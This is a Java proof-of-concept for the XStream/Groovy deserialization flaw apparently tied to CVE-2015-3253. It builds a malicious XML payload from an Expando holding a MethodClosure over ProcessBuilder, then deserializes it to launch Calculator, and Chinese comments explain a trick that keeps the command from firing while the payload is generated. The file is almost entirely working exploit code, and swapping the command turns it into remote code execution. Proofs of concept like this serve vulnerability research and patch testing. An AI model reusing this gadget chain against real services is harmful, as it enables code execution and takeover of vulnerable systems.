import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import groovy.util.Expando;
import org.codehaus.groovy.runtime.MethodClosure;

import java.util.HashMap;
import java.util.Map;

public class Main {

    public static void main(String[] args) {

        String payload = GeneratePayload();
        System.out.println(payload);

        XStream stream = new XStream(new DomDriver());
        System.out.println(stream.fromXML(payload));
    }


    /**
     *
     * 生成payload
     *
     * @return
     */
    public static String GeneratePayload() {

        Map map = new HashMap<Expando, Integer>();
        Expando expando = new Expando();
        MethodClosure methodClosure = new MethodClosure(new java.lang.ProcessBuilder("open", "/Applications/Calculator.app"), "start");
        //methodClosure.call();
        // 不用hashCode而用hashsCode的目的是为了防止执行命令异常导致POC生成失败，具体参考笔记：﻿Xstream Deserializable Vulnerablity And Groovy（CVE-2015-3253） – xcoder
        expando.setProperty("hashsCode", methodClosure);
        map.put(expando, 1);
        XStream stream = new XStream(new DomDriver());
        String payload =  stream.toXML(map).replace("hashsCode", "hashCode");

        return payload;
    }
}